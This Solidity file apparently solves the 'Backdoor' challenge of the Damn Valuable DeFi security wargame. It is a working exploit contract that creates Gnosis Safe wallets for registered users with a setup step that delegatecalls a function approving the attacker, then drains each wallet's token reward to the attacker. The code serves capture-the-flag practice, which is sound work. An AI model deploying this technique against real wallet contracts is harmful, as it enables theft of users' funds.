// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";



contract BackdoorAttacker {

    address private attacker;
    address private walletFactory;
    address private masterCopy;
    address private walletRegistry;
    address private token;

    constructor(address _attacker, address _walletFactory, address _masterCopy, address _walletRegistry, address _token) {
        attacker = _attacker;
        walletFactory = _walletFactory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    //Function will be executed from proxy wallet via delegatecall when setting up modules and will approve the
    //spendance of rewarded tokens by this contract
    //msg.sender == deployed proxy wallet
    function backdoor(address _tokenAddress, address _attackerContractAddress) external {
        DamnValuableToken(_tokenAddress).approve(_attackerContractAddress, 10 ether);
    }

    function attack(address[] memory users, bytes memory execData) external {

        //Looping for every user to get their token rewards after deploying their wallets in one tx.
        for(uint i = 0; i < users.length; i++){
            
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            //Gnosis Safe' setup data
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                uint256(1),
                address(this),
                execData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );
            
            //Deploy proxy wallet with encoded Gnosis Safe setup data and wallet registry
            //for the callback
            GnosisSafeProxy proxyWallet = GnosisSafeProxyFactory(walletFactory)
            .createProxyWithCallback(
                masterCopy,
                initializer,
                0,
                IProxyCreationCallback(walletRegistry)
            );
            
            //Call tokens transferFrom from deployed proxy wallet to attacker's address,
            //after the approval to this contract was done in proxy wallet creation/setup. 
            DamnValuableToken(token).transferFrom(
                address(proxyWallet),
                attacker,
                10 ether
            );
        }
    }





}